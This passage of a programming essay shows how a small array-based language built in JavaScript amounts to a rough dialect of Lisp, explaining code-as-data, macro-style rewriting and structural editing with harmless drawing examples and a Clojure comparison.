<span>})</span></code></pre><p>Holy jeez, with just this code, we can parse this: </p><pre><code><span>[</span>
<span>  </span><span>&#34;do&#34;</span><span>,</span>
<span>  [</span>
<span>    </span><span>&#34;def&#34;</span><span>,</span>
<span>    </span><span>&#34;drawTriangle&#34;</span><span>,</span>
<span>    [</span>
<span>      </span><span>&#34;fn&#34;</span><span>,</span>
<span>      [</span><span>&#34;left&#34;</span><span>, </span><span>&#34;top&#34;</span><span>, </span><span>&#34;right&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>      [</span>
<span>        </span><span>&#34;do&#34;</span><span>,</span>
<span>        [</span><span>&#34;drawLine&#34;</span><span>, </span><span>&#34;left&#34;</span><span>, </span><span>&#34;top&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>        [</span><span>&#34;drawLine&#34;</span><span>, </span><span>&#34;top&#34;</span><span>, </span><span>&#34;right&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>        [</span><span>&#34;drawLine&#34;</span><span>, </span><span>&#34;left&#34;</span><span>, </span><span>&#34;right&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>      ],</span>
<span>    ],</span>
<span>  ],</span>
<span>  [</span><span>&#34;drawTriangle&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>&#34;blue&#34;</span><span>],</span>
<span>  [</span><span>&#34;drawTriangle&#34;</span><span>, { x: </span><span>6</span><span>, y: </span><span>6</span><span> }, { x: </span><span>10</span><span>, y: </span><span>10</span><span> }, { x: </span><span>6</span><span>, y: </span><span>16</span><span> }, </span><span>&#34;purple&#34;</span><span>],</span>
<span>])</span></code></pre><p>We can compose functions, we can define variables, and we can even create our own functions. If we think about it, we just created a programming language! <sup>[<!-- -->1<!-- -->]</sup>.</p><p>Here’s an example of our triangle 🙂 </p><p>And here’s a happy person! </p><p>We may even notice something interesting. Our new array language has advantages to JavaScript itself! </p><h2 id="nothing-special">Nothing special</h2><p>In JavaScript, you define variables by writing <code>const x = foo</code>. Say you wanted to “rewrite” <code>const</code> to be just <code>c</code>. You couldn’t do this, because  <code>const x = foo</code> is special syntax in JavaScript. You’re not allowed to change that around. </p><p>In our array language though, there’s no syntax at all! Everything is just arrays. We could easily write some special <code>c</code> instruction that works just like <code>def</code>. </p><p>If we think about it, it’s as though in Javascript we are guests, and we need to follow the language designer’s rules. But in our array language, we are “co-owners”. There is no big difference between the “built-in” stuff (“def”, “fn”) the language designer wrote, and the stuff we write! (“drawTriangle”). </p><h2 id="code-is-data">Code is Data</h2><p>There’s another, much more resounding win. If our code is just a bunch of arrays, we can <em>do stuff</em> to the code. We could write code that generates code!</p><p>For example, say we wanted to support <code>unless</code> in Javascript. </p><p>Whenever someone writes</p><pre><code><span>unless</span><span> </span><span>foo</span><span> { </span>
<span>   </span><span>...</span>
<span>}</span></code></pre><p>We can rewrite it to</p><pre><code><span>if</span><span> </span><span>!</span><span>foo</span><span> { </span>
<span>   </span><span>...</span>
<span>}</span></code></pre><p>This would be difficult to do. We’d need something like Babel to parse our file, and work on top of the AST to make sure we rewrite our code safely to</p><pre><code><span>if</span><span> </span><span>!</span><span>foo</span><span> { </span>
<span>  </span><span>...</span>
<span>}</span></code></pre><p>But in our array language, our code is just arrays! It’s easy to rewrite <code>unless</code>: </p><pre><code><span>function</span><span> </span><span>rewriteUnless</span><span>(</span><span>unlessCode</span><span>) {</span>
<span>   </span><span>const</span><span> [</span><span>_unlessInstructionName</span><span>, </span><span>testCondition</span><span>, </span><span>consequent</span><span>] </span><span>=</span><span> </span><span>unlessCode</span><span>; </span>
<span>   </span><span>return</span><span> [</span><span>&#34;if&#34;</span><span>, [</span><span>&#34;not&#34;</span><span>, </span><span>testCondition</span><span>], </span><span>consequent</span><span>]</span>
<span>}</span></code></pre><pre><code><span>rewriteUnless</span><span>([</span><span>&#34;unless&#34;</span><span>, [</span><span>&#34;=&#34;</span><span>, </span><span>1</span><span>, </span><span>1</span><span>], [</span><span>&#34;drawLine&#34;</span><span>]])</span>
<span>// =&gt; </span>
<span>[</span><span>&#34;if&#34;</span><span>, [</span><span>&#34;not&#34;</span><span>, [</span><span>&#34;=&#34;</span><span>, </span><span>1</span><span>, </span><span>1</span><span>]], [</span><span>&#34;drawLine&#34;</span><span>]];</span></code></pre><p>Oh my god. Easy peasy. </p><p>Having your code represented as data doesn’t just allow you to manipulate your code with ease. It also allows your editor to do it too. For example, say you are editing this code: </p><pre><code><span>[</span><span>&#34;if&#34;</span><span>, </span><span>testCondition</span><span>, </span><span>consequent</span><span>]</span></code></pre><p>You want to change <code>testCondition</code>  to <code>[&#34;not&#34;, testCondition]</code></p><p>You could bring your cursor over to <code>testCondition</code> </p><pre><code><span>[</span><span>&#34;if&#34;</span><span>, </span><span>|</span><span>testCondition</span><span>, </span><span>consequent</span><span>]</span></code></pre><p>Then create an array </p><pre><code><span>[</span><span>&#34;if&#34;</span><span>, [</span><span>|</span><span>] </span><span>testCondition</span><span>, </span><span>consequent</span><span>]</span></code></pre><p>Now you can type “not” </p><pre><code><span>[</span><span>&#34;if&#34;</span><span>, [</span><span>&#34;not&#34;</span><span>, </span><span>|</span><span>] </span><span>testCondition</span><span>, </span><span>consequent</span><span>]</span></code></pre><p>If your editor understood these arrays, you can tell it: “expand” this area to the right: </p><pre><code><span>[</span><span>&#34;if&#34;</span><span>, [</span><span>&#34;not&#34;</span><span>, </span><span>testCondition</span><span>], </span><span>consequent</span><span>]</span></code></pre><p>Boom. Your editor helped your change the structure of your code.</p><p>If you wanted to undo this, You can put your cursor beside <code>testCondition</code>, </p><pre><code><span>[</span><span>&#34;if&#34;</span><span>, [</span><span>&#34;not&#34;</span><span>, </span><span>|</span><span>testCondition</span><span>], </span><span>consequent</span><span>]</span></code></pre><p>and ask the editor to “raise” this up one level: </p><pre><code><span>[</span><span>&#34;if&#34;</span><span>, </span><span>testCondition</span><span>, </span><span>consequent</span><span>]</span></code></pre><p>All of a sudden, instead of editing characters, you are editing the <em>structure</em> of your code. This is called structural editing <sup>[<!-- -->2<!-- -->]</sup>. It can help you move with the speed of a potter,  and is one of the many wins you’ll get when your code is data.</p><p>Well, this array language you happened to have discovered…is a poorly implemented dialect of Lisp!</p><p>Here’s our most complicated example: </p><pre><code><span>[</span>
<span>  </span><span>&#34;do&#34;</span><span>,</span>
<span>  [</span>
<span>    </span><span>&#34;def&#34;</span><span>,</span>
<span>    </span><span>&#34;drawTriangle&#34;</span><span>,</span>
<span>    [</span>
<span>      </span><span>&#34;fn&#34;</span><span>,</span>
<span>      [</span><span>&#34;left&#34;</span><span>, </span><span>&#34;top&#34;</span><span>, </span><span>&#34;right&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>      [</span>
<span>        </span><span>&#34;do&#34;</span><span>,</span>
<span>        [</span><span>&#34;drawLine&#34;</span><span>, </span><span>&#34;left&#34;</span><span>, </span><span>&#34;top&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>        [</span><span>&#34;drawLine&#34;</span><span>, </span><span>&#34;top&#34;</span><span>, </span><span>&#34;right&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>        [</span><span>&#34;drawLine&#34;</span><span>, </span><span>&#34;left&#34;</span><span>, </span><span>&#34;right&#34;</span><span>, </span><span>&#34;color&#34;</span><span>],</span>
<span>      ],</span>
<span>    ],</span>
<span>  ],</span>
<span>  [</span><span>&#34;drawTriangle&#34;</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>&#34;blue&#34;</span><span>],</span>
<span>  [</span><span>&#34;drawTriangle&#34;</span><span>, { x: </span><span>6</span><span>, y: </span><span>6</span><span> }, { x: </span><span>10</span><span>, y: </span><span>10</span><span> }, { x: </span><span>6</span><span>, y: </span><span>16</span><span> }, </span><span>&#34;purple&#34;</span><span>],</span>
<span>])</span></code></pre><p>And here’s how that looks in Clojure, a dialect of lisp: </p><pre><code><span>(</span><span>do</span><span> </span>
<span>  (</span><span>def</span><span> draw-triangle (</span><span>fn</span><span> [left top right color]</span>
<span>                       (</span><span>draw-line</span><span> left top color)</span>
<span>                       (</span><span>draw-line</span><span> top right color)</span>
<span>                       (</span><span>draw-line</span><span> left right color)))</span>
<span>  (</span><span>draw-triangle</span><span> {</span><span>:x</span><span> </span><span>0</span><span> </span><span>:y</span><span> </span><span>0</span><span>} {</span><span>:x</span><span> </span><span>3</span><span> </span><span>:y</span><span> </span><span>3</span><span>} {</span><span>:x</span><span> </span><span>6</span><span> </span><span>:y</span><span> </span><span>0</span><span>} </span><span>&#34;blue&#34;</span><span>)</span>
<span>  (</span><span>draw-triangle</span><span> {</span><span>:x</span><span> </span><span>6</span><span> </span><span>:y</span><span> </span><span>6</span><span>} {</span><span>:x</span><span> </span><span>10</span><span> </span><span>:y</span><span> </span><span>10</span><span>} {</span><span>:x</span><span> </span><span>6</span><span> </span><span>:y</span><span> </span><span>16</span><span>} </span><span>&#34;purple&#34;</span><span>))</span></code></pre><p>The changes are cosmetic: </p><ul><li><code>()</code> now represent lists </li><li>We removed all the commas</li><li>camelCase became kebab-case</li><li>Instead of using strings everywhere, we added one more data type: a <code>symbol</code> <ul><li>A symbol is used to look stuff up: i.e <code>&#34;drawTriangle&#34;</code> became <code>draw-triangle</code></li></ul></li></ul><p>The rest of the rules are the same: </p><p><code>(draw-line left top color)</code> </p><p>means </p><ul><li>Evaluate <code>left</code>, <code>top</code>, <code>color</code>, and replace them with their values</li><li>Run the function <code>draw-line</code>  with those values</li></ul><p>Now, if we agree that the ability to manipulate source code is important to us, what kind of languages are most conducive for supporting it? </p><p>One way we can solve that question is to rephrase it: how could we make manipulating code as intuitive as manipulating <em>data</em> within <em>our code</em>? The answer sprouts out: Make the code data! What an exciting conclusion. If we care about manipulating source code, we glide into the answer: the code <em>must</em> be data <sup>[<!-- -->3<!-- -->]</sup>.</p><p>If the code must be data, what kind of data representation could we use? XML could work, JSON could work, and the list goes on. But, what would happen if we tried to find the simplest data structure? If we keep simplifying, we glide into to the simplest nested structure of all…lists!</p><p>This is both illuminating and exciting. </p><p>It’s illuminating, in the sense that it seems like Lisp is “discovered”. It’s like the solution to an optimization problem: if you care about manipulating code, you gravitate towards discovering Lisp. There’s something awe-inspiring about using a tool that’s discovered: who knows, alien life-forms could use Lisp! </p><p>It’s exciting, in that, there <em>may</em> be a better syntax. We don’t know. Ruby and Python in my opinion were experiments, trying to bring lisp-like power without the brackets. I don’t think the question is a solved one yet. Maybe you can think about it 🙂</p><p>You can imagine how expressive you can be if you can rewrite the code your language is written in. You’d truly be on the same footing as the language designer, and the abstractions you could write at that level, can add up to save you years of work. </p><p>All of a sudden, those brackets look kind of cool! </p><hr/><p><em>Thanks to Daniel Woelfel, <a href="https://frantic.im/" target="_blank">Alex Kotliarskyi</a>, Sean Grove, Joe Averbukh, Irakli Safareli, for reviewing drafts of this essay</em></p></span></p></div></div></div></div>
  </body>
</html>
